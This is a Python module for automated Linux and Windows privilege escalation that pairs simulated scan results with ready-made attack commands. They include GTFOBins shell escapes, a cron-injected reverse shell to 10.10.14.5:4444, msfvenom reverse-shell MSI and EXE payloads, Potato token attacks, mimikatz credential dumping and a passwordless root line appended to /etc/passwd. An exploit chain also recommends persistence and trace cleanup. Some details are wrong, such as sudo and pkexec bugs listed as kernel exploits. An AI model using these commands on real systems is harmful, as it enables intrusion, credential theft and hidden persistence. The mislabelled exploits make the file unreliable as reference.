"""
Automated Privilege Escalation Module
Detects misconfigurations, kernel exploits, and provides escalation paths for Linux and Windows.
"""

import asyncio
import json
import re
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class EscalationTechnique(str, Enum):
    """Privilege escalation techniques"""
    KERNEL_EXPLOIT = "kernel_exploit"
    SUID_BINARY = "suid_binary"
    SUDO_MISCONFIGURATION = "sudo_misconfiguration"
    CAPABILITIES = "capabilities"
    CRON_JOB = "cron_job"
    WRITABLE_SERVICE = "writable_service"
    PATH_HIJACKING = "path_hijacking"
    TOKEN_IMPERSONATION = "token_impersonation"
    UNQUOTED_SERVICE = "unquoted_service"
    ALWAYS_INSTALL_ELEVATED = "always_install_elevated"
    WEAK_PERMISSIONS = "weak_permissions"
    PASSWORD_IN_FILE = "password_in_file"


@dataclass
class EscalationVector:
    """Privilege escalation opportunity"""
    technique: EscalationTechnique
    severity: str  # critical, high, medium, low
    target: str  # File path, service name, or process
    description: str
    exploitation_command: str
    success_probability: int  # 0-100
    os_type: str  # linux, windows
    cve: Optional[str] = None
    requires_tools: List[str] = field(default_factory=list)
    cleanup_commands: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "technique": self.technique.value,
            "severity": self.severity,
            "target": self.target,
            "description": self.description,
            "exploitation_command": self.exploitation_command,
            "success_probability": self.success_probability,
            "os_type": self.os_type,
            "cve": self.cve,
            "requires_tools": self.requires_tools,
            "cleanup_commands": self.cleanup_commands
        }


class PrivilegeEscalationScanner:
    """Automated privilege escalation scanner for Linux and Windows"""
    
    def __init__(self):
        # Linux kernel exploit database (simplified)
        self.kernel_exploits = {
            "2.6.22": {"name": "vmsplice", "cve": "CVE-2008-0600", "probability": 85},
            "2.6.39": {"name": "mempodipper", "cve": "CVE-2012-0056", "probability": 80},
            "3.13.0": {"name": "overlayfs", "cve": "CVE-2015-1328", "probability": 90},
            "3.16.0": {"name": "overlayfs", "cve": "CVE-2015-8660", "probability": 85},
            "4.4.0": {"name": "dirty_cow", "cve": "CVE-2016-5195", "probability": 95},
            "4.8.0": {"name": "dirty_cow", "cve": "CVE-2016-5195", "probability": 95},
            "4.13.0": {"name": "waitid", "cve": "CVE-2017-5123", "probability": 80},
            "4.15.0": {"name": "get_rekt", "cve": "CVE-2018-18955", "probability": 75},
            "5.4.0": {"name": "sudo_baron_samedit", "cve": "CVE-2021-3156", "probability": 90},
            "5.8.0": {"name": "pkexec_pwnkit", "cve": "CVE-2021-4034", "probability": 95},
        }
        
        # GTFOBins - SUID binaries that can be exploited
        self.gtfobins = {
            "nmap": "nmap --interactive; !sh",
            "vim": "vim -c ':!/bin/bash'",
            "find": "find / -exec /bin/bash -p \\;",
            "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
            "perl": "perl -e 'exec \"/bin/bash\";'",
            "python": "python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "ruby": "ruby -e 'exec \"/bin/bash\"'",
            "lua": "lua -e 'os.execute(\"/bin/bash\")'",
            "less": "less /etc/passwd; !/bin/bash",
            "more": "more /etc/passwd; !/bin/bash",
            "man": "man man; !/bin/bash",
            "vi": "vi -c ':!/bin/bash'",
            "nano": "nano -s /bin/bash; ^T; reset; sh 1>&0 2>&0",
            "cp": "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p",
            "mv": "mv /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p",
            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
            "zip": "zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\"",
            "git": "git help config; !/bin/bash",
            "ftp": "ftp; !/bin/bash",
            "socat": "socat stdin exec:/bin/bash",
            "screen": "screen -x root/",
            "tmux": "tmux -S /tmp/tmux",
            "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
            "lxc": "lxc exec <container> /bin/bash",
            "systemctl": "systemctl status; !/bin/bash"
        }
        
        # Linux capabilities that can be exploited
        self.dangerous_capabilities = {
            "cap_setuid": "python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "cap_dac_read_search": "# Can read any file\ncat /etc/shadow",
            "cap_dac_override": "# Can write any file\necho 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",
            "cap_sys_admin": "# Can mount filesystems\nmount -o bind /bin/bash /tmp/bash",
            "cap_sys_ptrace": "# Can inject into any process\ngdb -p <pid>",
            "cap_sys_module": "# Can load kernel modules\ninsmod rootkit.ko"
        }
    
    async def scan_linux(self, target_info: Dict = None) -> List[EscalationVector]:
        """Scan for Linux privilege escalation vectors"""
        vectors = []
        
        # Check kernel version for exploits
        kernel_vectors = await self._check_kernel_exploits()
        vectors.extend(kernel_vectors)
        
        # Check SUID binaries
        suid_vectors = await self._check_suid_binaries()
        vectors.extend(suid_vectors)
        
        # Check sudo misconfigurations
        sudo_vectors = await self._check_sudo_misconfig()
        vectors.extend(sudo_vectors)
        
        # Check capabilities
        cap_vectors = await self._check_capabilities()
        vectors.extend(cap_vectors)
        
        # Check writable cron jobs
        cron_vectors = await self._check_cron_jobs()
        vectors.extend(cron_vectors)
        
        # Check for passwords in files
        password_vectors = await self._check_passwords_in_files()
        vectors.extend(password_vectors)
        
        # Check PATH hijacking opportunities
        path_vectors = await self._check_path_hijacking()
        vectors.extend(path_vectors)
        
        return vectors
    
    async def scan_windows(self, target_info: Dict = None) -> List[EscalationVector]:
        """Scan for Windows privilege escalation vectors"""
        vectors = []
        
        # Check AlwaysInstallElevated
        aie_vectors = await self._check_always_install_elevated()
        vectors.extend(aie_vectors)
        
        # Check unquoted service paths
        unquoted_vectors = await self._check_unquoted_service_paths()
        vectors.extend(unquoted_vectors)
        
        # Check writable services
        writable_vectors = await self._check_writable_services()
        vectors.extend(writable_vectors)
        
        # Check token impersonation
        token_vectors = await self._check_token_impersonation()
        vectors.extend(token_vectors)
        
        # Check weak permissions
        perm_vectors = await self._check_weak_permissions()
        vectors.extend(perm_vectors)
        
        # Check stored credentials
        cred_vectors = await self._check_stored_credentials()
        vectors.extend(cred_vectors)
        
        return vectors
    
    async def _check_kernel_exploits(self) -> List[EscalationVector]:
        """Check for kernel exploit opportunities"""
        vectors = []
        
        # Simulated kernel version check
        # In real scenario: uname -r
        simulated_kernels = ["4.4.0-21-generic", "5.4.0-42-generic", "3.13.0-32-generic"]
        
        for kernel_version in simulated_kernels:
            base_version = '.'.join(kernel_version.split('.')[:3])
            if base_version in self.kernel_exploits:
                exploit = self.kernel_exploits[base_version]
                
                vectors.append(EscalationVector(
                    technique=EscalationTechnique.KERNEL_EXPLOIT,
                    severity="critical",
                    target=f"Kernel {kernel_version}",
                    description=f"{exploit['name']} - Local privilege escalation via kernel vulnerability",
                    exploitation_command=f"""# Download exploit for {exploit['cve']}
wget https://www.exploit-db.com/download/{exploit['name']}.c -O /tmp/exploit.c
gcc /tmp/exploit.c -o /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit""",
                    success_probability=exploit['probability'],
                    os_type="linux",
                    cve=exploit['cve'],
                    requires_tools=["gcc", "wget"],
                    cleanup_commands=["rm /tmp/exploit", "rm /tmp/exploit.c"]
                ))
        
        return vectors
    
    async def _check_suid_binaries(self) -> List[EscalationVector]:
        """Check for exploitable SUID binaries"""
        vectors = []
        
        # Simulated SUID binary discovery
        # In real scenario: find / -perm -4000 2>/dev/null
        suid_binaries = ["/usr/bin/find", "/usr/bin/vim", "/usr/bin/python3.8", 
                        "/usr/bin/nmap", "/usr/bin/perl"]
        
        for binary_path in suid_binaries:
            binary_name = binary_path.split('/')[-1].replace('.', '').replace('3', '').replace('8', '')
            
            if binary_name in self.gtfobins:
                vectors.append(EscalationVector(
                    technique=EscalationTechnique.SUID_BINARY,
                    severity="high",
                    target=binary_path,
                    description=f"SUID binary {binary_name} can be exploited via GTFOBins",
                    exploitation_command=self.gtfobins[binary_name],
                    success_probability=90,
                    os_type="linux",
                    requires_tools=[],
                    cleanup_commands=[]
                ))
        
        return vectors
    
    async def _check_sudo_misconfig(self) -> List[EscalationVector]:
        """Check for sudo misconfigurations"""
        vectors = []
        
        # Simulated sudo -l output
        # In real scenario: sudo -l
        sudo_entries = [
            "(/usr/bin/vi) NOPASSWD: ALL",
            "(/usr/bin/find) NOPASSWD: ALL",
            "(ALL) NOPASSWD: /bin/systemctl restart *",
            "(root) NOPASSWD: /usr/bin/awk"
        ]
        
        for entry in sudo_entries:
            # Extract binary name
            match = re.search(r'/([^/\s)]+)', entry)
            if match:
                binary = match.group(1)
                
                if binary in self.gtfobins:
                    vectors.append(EscalationVector(
                        technique=EscalationTechnique.SUDO_MISCONFIGURATION,
                        severity="critical",
                        target=f"sudo {binary}",
                        description=f"Sudo allows {binary} without password - GTFOBins exploitation possible",
                        exploitation_command=f"sudo {self.gtfobins[binary]}",
                        success_probability=95,
                        os_type="linux",
                        requires_tools=[],
                        cleanup_commands=[]
                    ))
        
        return vectors
    
    async def _check_capabilities(self) -> List[EscalationVector]:
        """Check for dangerous capabilities"""
        vectors = []
        
        # Simulated getcap output
        # In real scenario: getcap -r / 2>/dev/null
        cap_binaries = [
            ("/usr/bin/python3.8", "cap_setuid+ep"),
            ("/usr/bin/perl", "cap_setuid+ep"),
            ("/usr/bin/tar", "cap_dac_read_search+ep")
        ]
        
        for binary_path, capability in cap_binaries:
            cap_name = capability.split('+')[0]
            
            if cap_name in self.dangerous_capabilities:
                vectors.append(EscalationVector(
                    technique=EscalationTechnique.CAPABILITIES,
                    severity="high",
                    target=f"{binary_path} ({capability})",
                    description=f"Binary has {cap_name} capability - can be exploited for privilege escalation",
                    exploitation_command=f"{binary_path} -c '{self.dangerous_capabilities[cap_name]}'",
                    success_probability=85,
                    os_type="linux",
                    requires_tools=[],
                    cleanup_commands=[]
                ))
        
        return vectors
    
    async def _check_cron_jobs(self) -> List[EscalationVector]:
        """Check for writable cron jobs"""
        vectors = []
        
        # Simulated cron job discovery
        writable_crons = [
            "/etc/cron.d/backup_script",
            "/var/spool/cron/crontabs/root",
            "/etc/cron.daily/custom_backup"
        ]
        
        for cron_path in writable_crons:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.CRON_JOB,
                severity="high",
                target=cron_path,
                description="Writable cron job file - can inject malicious commands",
                exploitation_command=f"""# Inject reverse shell into cron job
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" >> {cron_path}
# Or create SUID bash
echo "* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> {cron_path}""",
                success_probability=80,
                os_type="linux",
                requires_tools=[],
                cleanup_commands=[f"sed -i '/10.10.14.5/d' {cron_path}"]
            ))
        
        return vectors
    
    async def _check_passwords_in_files(self) -> List[EscalationVector]:
        """Check for passwords in configuration files"""
        vectors = []
        
        # Simulated password discovery
        password_files = [
            ("/var/www/html/config.php", "mysql_password='SuperSecretPass123'"),
            ("/home/user/.bash_history", "mysql -u root -p'Password123'"),
            ("/opt/scripts/backup.sh", "sshpass -p 'Admin@2024' ssh root@server")
        ]
        
        for file_path, password_line in password_files:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.PASSWORD_IN_FILE,
                severity="medium",
                target=file_path,
                description=f"Plaintext password found in file: {password_line[:50]}...",
                exploitation_command=f"""# Extract and try password
grep -i 'pass\\|pwd\\|password' {file_path}
# Try su with discovered passwords
su root""",
                success_probability=60,
                os_type="linux",
                requires_tools=[],
                cleanup_commands=[]
            ))
        
        return vectors
    
    async def _check_path_hijacking(self) -> List[EscalationVector]:
        """Check for PATH hijacking opportunities"""
        vectors = []
        
        # Simulated writable PATH directories
        writable_paths = ["/tmp", "/var/tmp", "/home/user/.local/bin"]
        
        for writable_dir in writable_paths:
            if writable_dir in ["/tmp", "/var/tmp"]:  # These are commonly in PATH
                vectors.append(EscalationVector(
                    technique=EscalationTechnique.PATH_HIJACKING,
                    severity="medium",
                    target=writable_dir,
                    description=f"Writable directory in PATH - can hijack system binaries",
                    exploitation_command=f"""# Create malicious binary
cat > {writable_dir}/ps << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x {writable_dir}/ps
# Wait for root to run 'ps' command
export PATH={writable_dir}:$PATH""",
                    success_probability=50,
                    os_type="linux",
                    requires_tools=[],
                    cleanup_commands=[f"rm {writable_dir}/ps"]
                ))
        
        return vectors
    
    async def _check_always_install_elevated(self) -> List[EscalationVector]:
        """Check for AlwaysInstallElevated registry keys"""
        vectors = []
        
        # Simulated registry check
        # In real scenario: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        always_elevated = True  # Simulated result
        
        if always_elevated:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.ALWAYS_INSTALL_ELEVATED,
                severity="critical",
                target="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                description="AlwaysInstallElevated enabled - MSI installers run with SYSTEM privileges",
                exploitation_command="""# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o exploit.msi
# Install with elevated privileges
msiexec /quiet /qn /i C:\\Users\\Public\\exploit.msi

# Or use PowerShell
$installer = New-Object -ComObject WindowsInstaller.Installer
$installer.UILevel = 2  # Silent
$installer.InstallProduct("C:\\Users\\Public\\exploit.msi")""",
                success_probability=95,
                os_type="windows",
                cve=None,
                requires_tools=["msfvenom"],
                cleanup_commands=["del C:\\Users\\Public\\exploit.msi"]
            ))
        
        return vectors
    
    async def _check_unquoted_service_paths(self) -> List[EscalationVector]:
        """Check for unquoted service paths"""
        vectors = []
        
        # Simulated service path discovery
        # In real scenario: wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
        unquoted_services = [
            "VulnerableService: C:\\Program Files\\Company\\Application\\service.exe",
            "BackupService: C:\\Program Files\\Backup Software\\agent.exe"
        ]
        
        for service_info in unquoted_services:
            service_name = service_info.split(':')[0]
            service_path = service_info.split(': ')[1]
            
            vectors.append(EscalationVector(
                technique=EscalationTechnique.UNQUOTED_SERVICE,
                severity="high",
                target=service_name,
                description=f"Unquoted service path allows DLL hijacking: {service_path}",
                exploitation_command=f"""# Create malicious executable at space location
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o "C:\\Program.exe"
# Or
copy C:\\Windows\\System32\\cmd.exe "C:\\Program.exe"

# Restart service
sc stop {service_name}
sc start {service_name}

# Or reboot system
shutdown /r /t 0""",
                success_probability=85,
                os_type="windows",
                requires_tools=["msfvenom", "sc.exe"],
                cleanup_commands=["del C:\\Program.exe"]
            ))
        
        return vectors
    
    async def _check_writable_services(self) -> List[EscalationVector]:
        """Check for writable service binaries"""
        vectors = []
        
        # Simulated writable service discovery
        writable_services = [
            ("VulnService", "C:\\Program Files\\VulnApp\\service.exe"),
            ("BackupAgent", "C:\\Backup\\agent.exe")
        ]
        
        for service_name, service_path in writable_services:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.WRITABLE_SERVICE,
                severity="critical",
                target=f"{service_name} ({service_path})",
                description="Service binary is writable - can replace with malicious executable",
                exploitation_command=f"""# Backup original
copy "{service_path}" "{service_path}.bak"

# Replace with malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o exploit.exe
move /Y exploit.exe "{service_path}"

# Restart service
sc stop {service_name}
sc start {service_name}""",
                success_probability=90,
                os_type="windows",
                requires_tools=["msfvenom", "sc.exe"],
                cleanup_commands=[f'move /Y "{service_path}.bak" "{service_path}"']
            ))
        
        return vectors
    
    async def _check_token_impersonation(self) -> List[EscalationVector]:
        """Check for token impersonation opportunities"""
        vectors = []
        
        # Check if SeImpersonatePrivilege is enabled
        # In real scenario: whoami /priv
        has_impersonate = True  # Simulated
        
        if has_impersonate:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.TOKEN_IMPERSONATION,
                severity="critical",
                target="SeImpersonatePrivilege",
                description="SeImpersonatePrivilege enabled - vulnerable to Potato attacks",
                exploitation_command="""# PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer.exe -i -c cmd

# RoguePotato (Windows 10/Server 2019+)
RoguePotato.exe -r 10.10.14.5 -e "cmd.exe" -l 9999

# JuicyPotato (Windows 7/8/2008/2012/2016)
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami > C:\\Users\\Public\\proof.txt" -t *

# GodPotato (Latest, works on patched systems)
GodPotato.exe -cmd "cmd /c whoami\"""",
                success_probability=95,
                os_type="windows",
                cve="CVE-2020-0787",
                requires_tools=["PrintSpoofer.exe", "RoguePotato.exe", "JuicyPotato.exe"],
                cleanup_commands=[]
            ))
        
        return vectors
    
    async def _check_weak_permissions(self) -> List[EscalationVector]:
        """Check for weak file/folder permissions"""
        vectors = []
        
        # Simulated weak permissions
        weak_perms = [
            ("C:\\Windows\\System32\\drivers\\vulnerable.sys", "F"),  # Full control
            ("C:\\Program Files\\Application\\config.xml", "W")  # Write
        ]
        
        for file_path, permission in weak_perms:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.WEAK_PERMISSIONS,
                severity="high",
                target=file_path,
                description=f"Weak permissions detected: {permission} (Full/Write access)",
                exploitation_command=f"""# Check permissions
icacls "{file_path}"

# Replace with malicious file
copy "{file_path}" "{file_path}.bak"
copy malicious.exe "{file_path}"

# Or modify configuration
echo "malicious_setting=true" >> "{file_path}\"""",
                success_probability=75,
                os_type="windows",
                requires_tools=[],
                cleanup_commands=[f'copy /Y "{file_path}.bak" "{file_path}"']
            ))
        
        return vectors
    
    async def _check_stored_credentials(self) -> List[EscalationVector]:
        """Check for stored credentials"""
        vectors = []
        
        # Simulated credential discovery
        cred_locations = [
            ("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword"),
            ("C:\\Users\\admin\\AppData\\Local\\Microsoft\\Credentials\\*", "Credential Manager"),
            ("C:\\Windows\\Panther\\Unattend.xml", "Administrator Password")
        ]
        
        for location, cred_type in cred_locations:
            vectors.append(EscalationVector(
                technique=EscalationTechnique.PASSWORD_IN_FILE,
                severity="high",
                target=location,
                description=f"Stored credentials found: {cred_type}",
                exploitation_command=f"""# Extract credentials
# Registry:
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword

# Credential Manager:
vaultcmd /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# Unattend.xml:
type C:\\Windows\\Panther\\Unattend.xml | findstr /i password

# Use mimikatz to extract:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit\"""",
                success_probability=80,
                os_type="windows",
                requires_tools=["mimikatz.exe", "vaultcmd.exe"],
                cleanup_commands=[]
            ))
        
        return vectors
    
    async def generate_report(self, vectors: List[EscalationVector]) -> Dict:
        """Generate privilege escalation report"""
        
        if not vectors:
            return {
                "status": "no_vectors_found",
                "message": "No privilege escalation vectors detected",
                "vectors": []
            }
        
        # Sort by severity and success probability
        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        sorted_vectors = sorted(
            vectors,
            key=lambda v: (severity_order.get(v.severity, 0), v.success_probability),
            reverse=True
        )
        
        # Calculate statistics
        total_vectors = len(sorted_vectors)
        critical_count = sum(1 for v in sorted_vectors if v.severity == "critical")
        high_count = sum(1 for v in sorted_vectors if v.severity == "high")
        
        # Get top 5 recommendations
        top_vectors = sorted_vectors[:5]
        
        return {
            "status": "vectors_found",
            "total_vectors": total_vectors,
            "severity_breakdown": {
                "critical": critical_count,
                "high": high_count,
                "medium": sum(1 for v in sorted_vectors if v.severity == "medium"),
                "low": sum(1 for v in sorted_vectors if v.severity == "low")
            },
            "top_recommendations": [v.to_dict() for v in top_vectors],
            "all_vectors": [v.to_dict() for v in sorted_vectors],
            "automated_exploitation": self._generate_automated_exploit_chain(top_vectors)
        }
    
    def _generate_automated_exploit_chain(self, vectors: List[EscalationVector]) -> Dict:
        """Generate automated exploitation chain"""
        
        if not vectors:
            return {"available": False}
        
        # Get highest probability vector
        best_vector = max(vectors, key=lambda v: v.success_probability)
        
        return {
            "available": True,
            "recommended_technique": best_vector.technique.value,
            "target": best_vector.target,
            "success_probability": best_vector.success_probability,
            "exploitation_steps": [
                "1. Verify current privileges: whoami /priv (Windows) or id (Linux)",
                f"2. Execute: {best_vector.exploitation_command}",
                "3. Verify escalation: whoami (should show root/SYSTEM)",
                "4. Establish persistence if successful",
                "5. Clean up traces: " + ("; ".join(best_vector.cleanup_commands) if best_vector.cleanup_commands else "No cleanup needed")
            ],
            "fallback_techniques": [v.technique.value for v in vectors[1:4]] if len(vectors) > 1 else []
        }


async def main():
    """Example usage"""
    scanner = PrivilegeEscalationScanner()
    
    print("[*] Scanning for Linux privilege escalation vectors...")
    linux_vectors = await scanner.scan_linux()
    print(f"[+] Found {len(linux_vectors)} Linux escalation vectors")
    
    print("\n[*] Scanning for Windows privilege escalation vectors...")
    windows_vectors = await scanner.scan_windows()
    print(f"[+] Found {len(windows_vectors)} Windows escalation vectors")
    
    # Generate reports
    linux_report = await scanner.generate_report(linux_vectors)
    windows_report = await scanner.generate_report(windows_vectors)
    
    print(f"\n[+] Linux Report: {linux_report['total_vectors']} total vectors")
    print(f"    - Critical: {linux_report['severity_breakdown']['critical']}")
    print(f"    - High: {linux_report['severity_breakdown']['high']}")
    
    print(f"\n[+] Windows Report: {windows_report['total_vectors']} total vectors")
    print(f"    - Critical: {windows_report['severity_breakdown']['critical']}")
    print(f"    - High: {windows_report['severity_breakdown']['high']}")


if __name__ == "__main__":
    asyncio.run(main())
